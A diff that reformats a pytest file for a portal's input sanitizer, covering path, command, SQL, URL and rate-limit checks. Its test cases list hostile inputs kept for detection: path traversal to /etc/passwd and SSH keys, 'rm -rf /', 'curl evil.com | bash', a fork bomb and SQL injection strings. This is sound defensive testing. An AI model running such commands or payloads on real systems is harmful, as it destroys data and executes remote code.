@@ -10,33 +10,42 @@ from portal.security.security_module import InputSanitizer, RateLimiter
 class TestInputSanitizerPaths:
     """Test file path validation and sanitization."""
 
-    @pytest.mark.parametrize("path", [
-        "../../etc/passwd",
-        "../../../root/.ssh/id_rsa",
-        "..\\..\\windows\\system32",
-        "%2e%2e%2f",
-        "%2e%2e%2fetc%2fpasswd",
-    ])
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "../../etc/passwd",
+            "../../../root/.ssh/id_rsa",
+            "..\\..\\windows\\system32",
+            "%2e%2e%2f",
+            "%2e%2e%2fetc%2fpasswd",
+        ],
+    )
     def test_path_traversal_detected(self, path):
         is_valid, error = InputSanitizer.validate_file_path(path)
         assert not is_valid, f"Path traversal not detected: {path}"
         assert error is not None
 
-    @pytest.mark.parametrize("path", [
-        "/etc/passwd",
-        "/etc/shadow",
-        "/boot/grub/grub.cfg",
-    ])
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "/etc/passwd",
+            "/etc/shadow",
+            "/boot/grub/grub.cfg",
+        ],
+    )
     def test_sensitive_path_blocked(self, path):
         is_valid, error = InputSanitizer.validate_file_path(path)
         assert not is_valid, f"Sensitive path not blocked: {path}"
         assert "restricted" in error.lower()
 
-    @pytest.mark.parametrize("path", [
-        "/home/user/document.txt",
-        "./local/file.py",
-        "relative/path/file.txt",
-    ])
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "/home/user/document.txt",
+            "./local/file.py",
+            "relative/path/file.txt",
+        ],
+    )
     def test_safe_paths_allowed(self, path):
         is_valid, error = InputSanitizer.validate_file_path(path)
         if not is_valid and error:
@@ -51,24 +60,30 @@ class TestInputSanitizerPaths:
 class TestInputSanitizerCommands:
     """Test command sanitization."""
 
-    @pytest.mark.parametrize("cmd", [
-        "rm -rf /",
-        "curl evil.com | bash",
-        "wget malware.sh | sh",
-        ":(){ :|:&};:",
-        "curl https://evil.com/script.sh | bash",
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "rm -rf /",
+            "curl evil.com | bash",
+            "wget malware.sh | sh",
+            ":(){ :|:&};:",
+            "curl https://evil.com/script.sh | bash",
+        ],
+    )
     def test_dangerous_commands_detected(self, cmd):
         _, warnings = InputSanitizer.sanitize_command(cmd)
         assert len(warnings) > 0, f"Dangerous command not flagged: {cmd}"
 
-    @pytest.mark.parametrize("cmd", [
-        "ls -la",
-        "cat README.md",
-        "echo Hello World",
-        "pwd",
-        "ls -la /home/user",
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "ls -la",
+            "cat README.md",
+            "echo Hello World",
+            "pwd",
+            "ls -la /home/user",
+        ],
+    )
     def test_safe_commands_pass(self, cmd):
         _, warnings = InputSanitizer.sanitize_command(cmd)
         assert len(warnings) == 0, f"Safe command incorrectly flagged: {cmd}"
@@ -77,10 +92,13 @@ class TestInputSanitizerCommands:
 class TestInputSanitizerSQL:
     """Test SQL injection detection."""
 
-    @pytest.mark.parametrize("query", [
-        "'; DROP TABLE users",
-        "' OR '1'='1",
-    ])
+    @pytest.mark.parametrize(
+        "query",
+        [
+            "'; DROP TABLE users",
+            "' OR '1'='1",
+        ],
+    )
     def test_sql_injection_detected(self, query):
         safe, msg = InputSanitizer.sanitize_sql_query(query)
         assert safe is False
@@ -110,10 +128,13 @@ class TestInputSanitizerHTML:
 class TestInputSanitizerURL:
     """Test URL validation."""
 
-    @pytest.mark.parametrize("url", [
-        "https://example.com/page",
-        "http://localhost:8080/api",
-    ])
+    @pytest.mark.parametrize(
+        "url",
+        [
+            "https://example.com/page",
+            "http://localhost:8080/api",
+        ],
+    )
     def test_valid_urls_pass(self, url):
         valid, _ = InputSanitizer.validate_url(url)
         assert valid is True
@@ -182,4 +203,4 @@ class TestRateLimiter:
 
         for i in range(3):
             allowed, _ = await limiter.check_limit(user_id)
-            assert allowed, f"Request {i+1} was incorrectly blocked"
+            assert allowed, f"Request {i + 1} was incorrectly blocked"
